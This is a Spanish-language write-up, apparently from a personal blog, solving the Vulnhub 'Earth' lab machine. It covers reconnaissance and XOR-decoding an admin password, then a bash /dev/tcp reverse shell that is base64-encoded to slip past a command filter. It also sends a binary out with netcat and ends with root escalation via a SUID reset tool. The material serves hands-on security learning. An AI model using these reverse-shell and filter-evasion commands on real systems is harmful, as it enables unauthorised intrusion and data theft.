---
title : "Writeup: Earth Vulnhub | Sergio Castro"
author: Sergi Castro
date: 2025-09-15
categories: [Vulnhub, Vulnhub-Linux, Vulnhub-Easy]
tags: [nmap,exploits,netdiscover,netcat,binaries]
---

[Link Máquina](https://www.vulnhub.com/entry/the-planets-earth,755/)

# Contenido

- [Introducción](#introduccion)
- [Resumen General de Conceptos](#resumen-general-de-conceptos)
- [Fase de Enumeración](#fase-de-enumeración)
- [Exploración de las Páginas Web](#exploración-de-las-páginas-web)
- [Listado de Ficheros Internos](#listado-de-ficheros-internos)
- [Desencriptando los Mensajes](#desencriptando-los-mensajes)
- [Accediendo y Hackeando la tool del Admin](#accediendo-y-hackeando-la-tool-del-admin)
- [Primera Flag y Escalado de Privilegios](#primera-flag-y-escalado-de-privilegios)
- [Conclusiones](#conclusiones)

## Introducción {#introduccion}

Hola buenas, traigo la solución de la máquina de Vulnhub llamada Earth que es parte de una serie de máquinas de temática espacial, 
esta de base nos proporciona dos pistas interesantes:

Tenemos dos flags, la del usuario normal y la del usuario root por lo que el objetivo es parecido a Jangow, comprometer el sistema y escalar privilegios.

Espero disfrutéis de la guía/lectura.

## Resumen General de Conceptos {#resumen-general-de-conceptos}

- Aprendizaje de más flags de Nmap (ya mencionados en su apartado).

- Modificación de /etc/hosts para poder conectar a páginas con resolución DNS.

- Uso de Dirbuster, gobuster y otras herramientas para enumerar directorios ocultos web.

- Uso de Cyberchef y/u otras herramientas para decodificar y codificar mensajes, hashes etc.

- Codificación de shells reversas para saltar protecciones PHP y obtener conexión con máquinas remotas con netcat.

- Envió y recibimiento de archivos a través de una shell reversa dentro de una shell ya creada.

## Fase de Enumeración {#fase-de-enumeración}

Normalmente empezaremos enumerando los puertos, sin embargo esta vez contamos con una pequeña desventaja con respecto a la vez anterior, la máquina no nos proporciona la IP por lo que tendremos que descubrirla, podemos utilizar ARP para ver la tabla de conexiones pero existe una tool que simplifica el trabajo, esta permite descubrir los hosts conectados a una red por una interfaz x. Se llama netdiscover y para averiguar la IP podemos usarla así:

```
sudo netdiscover -r RED/MASCARA
```
-r: Es el parametro para indicar el escaneo a un direccion de red general y su máscara, en mi caso es máscara 24. 

Una vez realizado nos muestra los dispositivos conectados, gracias al saber que son máquinas sabemos que nuestro equipo vulnerable Earth es la dirección 104.

<img width="778" height="241" alt="image" src="https://github.com/user-attachments/assets/16beeed2-4fb7-46d8-b26a-c8f5224777fc" />

Aplicaremos ahora un nmap sobre esta IP para ver los puertos abiertos con el siguiente comando, donde he descubierto cosas interesantes para Nmap además de lo aprendido la otra vez.

```
nmap -sV -sC -p- -o earth.txt IP
```

Explico los nuevos parámetros:

-sC: Se le indica a nmap que use solo los scripts por defecto (ya que puedes añadir scripts extras).

-p-: Se especifica que se buscarán todos los puertos, si se quiere un rango usar -p 600-1000 por ejemplo del 6000 al 10000 o -p-1000 que permite escanear solo los primeros 1000 puertos.

-o: Manda la salida del comando a un fichero de salida, útil para repasar información ya obtenida o para otro software que permita usar estos datos para profundizar en análisis.

Una vez realizado vemos lo siguiente:

<img width="957" height="560" alt="image" src="https://github.com/user-attachments/assets/31c7cc62-bce8-46ab-9a78-ce4920530ddd" />

Observamos una gran cantidad de información de 3 puertos abiertos en específico:

- 22: SSH abierto donde nos muestra su versión y las claves hostkey

- 80: Puerto HTTP abierto, con su versión 2.4.5.1

- 443: Puerto HTTPs con una serie de datos de cabeceras y con dos datos interesantes de SSL, **dos hostname alternativos** llamados earth.local y terratest.earth.local

Sin estos hostname es totalmente imposible seguir ya que no podemos entrar a la web que contiene ya que necesita que el sistema que quiera entrar esté con dicho DNS, podemos ver como rechaza la conexión aquí:

<img width="1915" height="810" alt="image" src="https://github.com/user-attachments/assets/957adb4b-0a10-4ab7-b80a-5c885abc0415" />

Para arreglar esto añadimos los hostname a nuestro fichero hosts en etc usando en mi caso nano (podeís usar cualquier otro).

<img width="510" height="48" alt="image" src="https://github.com/user-attachments/assets/06478d71-511c-4020-a540-c581f5293761" />

Esto lo que hará es hacer que al conectarnos a earth.local, nos podamos conectar a la 104 desde SSL permitiendo visualizar la web que haya por atrás.

Una vez añadido nos vamos adentro de https://earth.local y veamos su contenido.

## Exploración de las Páginas Web {#exploración-de-las-páginas-web}

Abriendo earth.local, vemos esto:

<img width="1918" height="900" alt="image" src="https://github.com/user-attachments/assets/6c661708-96a1-4875-bb0b-4288ba7ad8aa" />

Vemos que nos aparece una web para mandar un mensaje a la Tierra y nos pide el mensaje y una clave para el mensaje, además podemos ver los anteriores mensajes encriptados.

Si abrimos la terratest, nos aparece lo siguiente:

<img width="1918" height="853" alt="image" src="https://github.com/user-attachments/assets/9d93e3c2-4276-4609-a595-ea778a1c1144" />

Nos dirá que está en pruebas y que ignoremos la web.

A simple vista no vemos nada en ninguna ni siquiera con el View Source

<img width="1455" height="540" alt="image" src="https://github.com/user-attachments/assets/0918b615-0033-4075-b4ef-53408d2ddf13" />

<img width="1252" height="237" alt="image" src="https://github.com/user-attachments/assets/3edaf341-21ea-4c7b-b030-3d150fe28f6e" />

## Listado de Ficheros Internos {#listado-de-ficheros-internos}

Existen varias formas de automatizar el proceso, investigando he encontrado la aplicación gobuster donde pasándole un simple diccionario de directorios es capaz de identificar de una web todo tipo de directorios que coincidan con el diccionario, al ser algo sencillo creo que puede ser de utilidad así que lo vamos a usar.

En mi caso usaré el small de Dirbuster (similar a gobuster) pero también puede servir el big o el medium

<img width="1180" height="622" alt="image" src="https://github.com/user-attachments/assets/94fc9af9-32fa-4c46-891d-f6a36560781f" />

Descargamos el fichero y una vez descargados aplicamos el gobuster sobre earth.local a ver que descubrimos:

```
gobuster dir -u https://earth.local -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```
<img width="1077" height="440" alt="image" src="https://github.com/user-attachments/assets/a72e5295-3bb8-4b1c-b9e0-9cc7159d8c3e" />

Una vez acabados podemos ver que ha encontrado un directorio oculto llamado /admin, si nos vamos a admin en la página nos aparecerá lo siguiente:

<img width="1736" height="352" alt="image" src="https://github.com/user-attachments/assets/df09158f-cc9b-4645-a2b5-6758c8883c6d" />

Nos aparecerá una herramienta de administración para usuarios admin, y si nos logeamos nos pedirá usuario y contraseña que no conocemos.

<img width="1503" height="396" alt="image" src="https://github.com/user-attachments/assets/865f9da1-18a7-4476-baaa-ec6dacd0f577" />

Vamos a intentar irnos al dominio terratest, que en principio no nos daba información, a ver si igualmente existen directorios ocultos con gobuster (esta vez con un diccionario de términos de web comunes como el .htaccess etc).

```
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt
```

PD: El parámetro k es para evitar la verificación del certificado SSL (por lo que podemos usar https).

Una vez terminado la búsqueda tenemos:

<img width="871" height="448" alt="image" src="https://github.com/user-attachments/assets/befb7861-f4d7-4bcf-b0ba-27b9ba052c4f" />

Nos lista los directorios encontrados en el diccionario y que coincide con el contenido existente en la web, aquí vemos que ha localizado el fichero robots.txt usado para indicar lo que no debe ser indexado. Veamos que contiene:

<img width="1368" height="855" alt="image" src="https://github.com/user-attachments/assets/4bedb9b8-874e-4e70-90af-fd026fdef0c9" />

Vemos una serie de extensiones y un nombre interesante: testingnotes, sabiendo que puede ser cualquiera de esa extensiones y usando la lógica podemos pensar que hay un fichero más oculto dentro de la web con ese nombre y con la extensión txt ya que podría es algo que se entiende con el nombre de notas, probemos con esa extensión y veremos que sucede:

<img width="1187" height="377" alt="image" src="https://github.com/user-attachments/assets/1cfa6536-8770-4b66-b0fb-bc6e0a654e32" />

Descubrimos la nota y vemos una serie de notas con pistas:

- El usuario del panel de administración es terra
- testdata.txt es usado para probar el sistema de encriptación de los mensajes y la clave se encuentra hay dentro.
- Los mensajes son encriptados usando XOR.

Sabiendo estas pistas veamos la clave en el fichero testdata:

<img width="1918" height="315" alt="image" src="https://github.com/user-attachments/assets/c63dbc5c-93f9-42ce-8171-b8f87f8f40ba" />

Vemos la clave que es un mensaje relacionado con el espacio. Ahora lo que haremos será pasar a la desencriptación del mensaje de earth.local una vez conocido el sistema que utiliza.

## Desencriptando los Mensajes {#desencriptando-los-mensajes}

Para hacerlo podemos usar multitud de herramientas, sin embargo yo voy a usar una muy conocida llamada cyberchef, que contiene multitud de algoritmos para encriptar y desencriptar mensajes.

```
https://gchq.github.io/CyberChef
```
Configuramos los modulos de From Hex (ya que vamos a convertir de una cadena hexadecimal) a XOR, añadiendo después también este módulo de XOR donde le configuramos la key que obtuvimos de testdata.txt en formato UTF-8 (ya que depende de este formato), después solo le pasamos el mensaje XOR, en este caso escogí el último ya que tras probar los otros dos, no funcionó. Con esto nos muestra la clave de forma repetida varias veces siendo finalmente: earthclimatechangebad4humans para el usuario terra.

<img width="1918" height="903" alt="Captura de pantalla 2025-09-14 223443" src="https://github.com/user-attachments/assets/fd644a0f-5289-405b-9bbf-bbf97d89c533" />

## Accediendo y Hackeando la tool del Admin {#accediendo-y-hackeando-la-tool-del-admin}

Para acceder en la tool del admin usamos el siguiente par de acceso:

```
terra:earthclimatechangebad4humans
```
<img width="1918" height="331" alt="image" src="https://github.com/user-attachments/assets/7552472a-5dba-4e99-9837-3d377b411fbb" />

El CLI que nos proporciona es sencillo, es una tool para probar comandos de shell en la web, esto nos puede dar pistas directamente de que podemos obtener una shell reversa:

<img width="1918" height="467" alt="image" src="https://github.com/user-attachments/assets/443d387e-d2af-41b3-8363-700ebaace1bb" />

Por ejemplo listamos los ficheros, la idea es obtener una conexión remota usando por ejemplo netcat, para ello podemos usar esta shell sencilla:

```
sh -i >& /dev/tcp/IPmaquina-anfitrion/PUERTO 0>&1
```

- sh -i: Inicia una shell interactiva (sh en modo interactivo).

- /dev/tcp/IPmaquinaremota/PUERTO: /dev/tcp/host/port es un pseudo-dispositivo especial. Permite abrir una conexión TCP directamente desde la shell hacia una dirección (IPmaquinaremota) y un puerto (PUERTO). Es decir, se conecta al puerto indicado de la máquina remota..

- >& /dev/tcp/... : Redirige la salida estándar (stdout) y la salida de errores (stderr) de la shell hacia esa conexión TCP. Todo lo que imprima la shell irá por la red al puerto remoto.

- 0>&1: Redirige la entrada estándar (stdin) a través de la misma conexión TCP. Así, todo lo que se escriba desde la máquina remota llega como entrada a la shell.

Una vez explicado el resumen será esta la que aplicaremos en el input text del CLI. Antes de hacerlo abrimos un netcat en nuestra máquina y asignamos al puerto que le diremos a la máquina earth que se conecte, en mi caso 9001.

```
nc -lvnp 9001
```

-l → listen: poner nc en modo escucha (esperar conexiones entrantes).

-v → verbose: modo verboso: muestra información extra sobre la conexión (útil para depurar).

-n → numeric-only: no resuelve nombres DNS ni intenta convertir direcciones; usa directamente IPs y puertos numéricos.

-p 9001 → port: especifica el puerto local en el que escuchar (en este caso el 9001).

<img width="700" height="150" alt="image" src="https://github.com/user-attachments/assets/12f30085-20b7-4351-9292-7d300f8697b0" />

Una vez hecho esto, vemos como al mandarle la shell directamente nos aparece: "Conexiones Remotas prohibidas", esto es porque no acepta conexiones simples, pero esto indica que podríamos encodearla de alguna forma para hacer que se la trage nuestro CLI

<img width="1918" height="468" alt="image" src="https://github.com/user-attachments/assets/43c7a1fe-5f04-4653-81c1-c31531315010" />

Para encodearla podemos simplemente hacerlo con base64, podemos hacerlo con un simple comando:

```
echo "sh -i >& /dev/tcp/IPAnfitrion/PUERTO 0>&1" | base64
```
<img width="638" height="97" alt="image" src="https://github.com/user-attachments/assets/3b88c1ab-ab8f-4052-91f5-46a345acff4b" />

Nos devolverá dicho comando encriptado en base64, ahora bien para usarlo en el CLI, primero tenemos que tener habilitado el netcat (como hicimos anteriormente), y ahora aplicar el siguiente comando:

```
echo "CADENABASE64" | base64 -d | bash
```
Esto hará concatenación de comandos, primero hará un echo o lectura de la shell encodeada, después la decodeará con base64 -d y finalmente hará la carga de una shell bash. (añadir a la cadena base64 otro = )

<img width="763" height="158" alt="image" src="https://github.com/user-attachments/assets/283aa80e-7fbf-429a-9c5e-fd36cea2f318" />

Una vez hecho, veremos que netcat ha aceptado la conexión y tendremos una shell con los permisos del usuario apache. Sin embargo, si la máquina tiene disponible python podemos establecer una shell mucho más comoda pudiendo "optimizar" la que ya tenemos, para ello comprobamos si python existe usando:

```
which python
```

<img width="627" height="102" alt="image" src="https://github.com/user-attachments/assets/cffa52d2-d5b1-4c28-a534-d88fe9167e4b" />

Y si existe (como es nuestro caso) podemos activar una shell mejor usando los siguientes comandos:

```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
**python -c 'import pty;pty.spawn("/bin/bash")**

- python -c '...' → ejecuta el código Python que pongas entre comillas desde la terminal, sin necesidad de guardar un archivo.

- import pty → importa el módulo pty (pseudo-terminal) de Python.

- pty.spawn("/bin/bash") → abre un proceso /bin/bash (una shell de Linux) dentro de un pseudo-terminal controlado por Python

**export TERM=xterm**

La variable de entorno TERM le dice al sistema qué tipo de terminal se está usando.

xterm es un tipo de terminal estándar que soporta colores, desplazamiento, atajos, etc.

Al exportarla, programas como vim, nano o less funcionan correctamente dentro de esa shell.

Sin esto, se verian cosas raras al intentar usar programas interactivos.

Una vez explicados los comandos que usaremos, los aplicaremos dentro de nuestra shell interactiva ya creada quedando el resultado final así:

<img width="581" height="202" alt="image" src="https://github.com/user-attachments/assets/b23554b9-5745-4723-bb3d-070279628a8f" />

Añado como ejemplo el comando ls pero como vemos ya tenemos una shell tipo bash, no es la forma más óptima pero si que nos ayuda a buscar la primera flag.

## Primera Flag y Escalado de Privilegios {#primera-flag-y-escalado-de-privilegios}

Primero vamos a obtener la flag del usuario simple, investigando dentro de /var/www/html no encontramos nada, como podemos ver aquí:

<img width="627" height="256" alt="image" src="https://github.com/user-attachments/assets/90092dfd-2015-49df-bce1-30ad0456a8c0" />

Solo vemos los ficheros que ya conociamos anteriormente, por lo que hay no puede estar, si retrocedemos un par de directorios hasta var podemos ver:

<img width="726" height="136" alt="image" src="https://github.com/user-attachments/assets/4c996f82-ee19-4892-9fc3-fda6293b530c" />

Vemos un directorio llamado earth_web y en su interior:

<img width="840" height="187" alt="image" src="https://github.com/user-attachments/assets/03f1111b-b446-4f3f-bc03-59e664124f62" />

Entre muchos ficheros encontramos la flag del usuario finalmente.

Ahora bien para poder escalar los privilegios, comprobaremos los SUID de los binarios de los sistemas que al igual que en jangow es una buena práctica de inicio, lo haremos usando el mismo comando de la anterior máquina.

```
find / -perm -u=s -type f 2>/dev/null
```
<img width="683" height="456" alt="image" src="https://github.com/user-attachments/assets/e53aba79-cd4e-4ad6-a32e-5bcca2ec6639" />

Entre los binarios vemos este que se llama reset_root que parece interesante, reiniciaría el acceso root y podríamos obtener el escalado que buscamos, vamos a probar a ejecutar el script:

<img width="585" height="150" alt="image" src="https://github.com/user-attachments/assets/a200d176-c96c-4cb5-aa54-aa9f14d3a3da" />

Vemos que requiere algunos triggers, que no tenemos y que ciertamente no sabemos nada sobre ellos, para obtener algo más de información investigando he encontrado la herramienta **ltrace**, que permite interceptar y mostrar las llamadas a funciones de las bibliotecas compartidas hechas por un proceso y sus argumentos y valores de retorno.

Nos servirá para depurar y hacer ingeniería inversa ligera al reset_root y extraer la información de los triggers.

Para ello primero nos llevamos el binario a nuestro sistema local, para ello usaremos netcat mismamente, abriendo otra shell por ejemplo en el puerto 9002 de la máquina anfitrión y diciendo que lo que se enviara a la máquina sera el reset_root de la máquina remota.

```
nc -lp 9002 > reset_root
```
Y esto será lo que escribamos en la shell remota de netcat ya abierta:

```
nc -w 3 ipanfitrion port < /usr/bin/reset_root
```

-w 3: establece un timeout (tiempo de espera) de 3 segundos. Según la versión de nc, esto afecta:

-- El tiempo máximo que espera al conectar, y/o el tiempo que espera tras EOF antes de cerrar la conexión.
-- (El comportamiento exacto puede variar entre implementaciones de netcat: traditional, GNU netcat, OpenBSD netcat, etc.)

- < /usr/bin/reset_root: redirección de entrada: el fichero /usr/bin/reset_root se lee y su contenido se envía como stdin a nc, por tanto sale por la conexión.

Cuando escribamos el nc en la shell ya abierta, se habrá enviado el fichero reset_root al anfitrión, en mi caso mi kali.

<img width="650" height="107" alt="image" src="https://github.com/user-attachments/assets/f5178a82-8c09-4e47-a43f-005772b02036" />

<img width="318" height="152" alt="image" src="https://github.com/user-attachments/assets/f15e7236-7f7a-4560-a5a4-b56b237c07a8" />

Le damos permisos de ejecución al fichero con:

```
chmod +x reset_root
```
Y ejecutamos con:

```
ltrace reset_root
```
<img width="1296" height="352" alt="image" src="https://github.com/user-attachments/assets/08f8e79b-b03e-41f0-aedc-6dd344e8470a" />

Nos da la pista de 3 ficheros que necesitamos tener, vamos a crearlos de manera manual ya que al no existir los mismos pues podemos hacerlo así con touch y con ello volver a probar el binario.

<img width="687" height="252" alt="image" src="https://github.com/user-attachments/assets/4e68d8de-4fb2-47f6-9a77-923e354d512f" />

Con esto tenemos reiniciada la contraseña del usuario su que ahora es Earth, por lo que finalmente tenemos acceso como root, ahora iniciamos sesión usando

```
su root
```
<img width="723" height="162" alt="image" src="https://github.com/user-attachments/assets/0f08e440-5e49-425b-abdc-30bff353c73f" />

Ya somos root, vamos al directorio del root para buscar la última flag:

<img width="1100" height="833" alt="image" src="https://github.com/user-attachments/assets/f81151b9-6162-4b78-9b8b-14a3d984e277" />

Y con esto completamos la máquina.

## Conclusiones {#conclusiones}

Fue una gran máquina, no muy larga pero muchos días estuve para acabarla, tiene algunas dificultes extras y algunas nuevas técnicas aprendidas como uso más avanzado de netcat o descubrimiento de nuevos binarios.
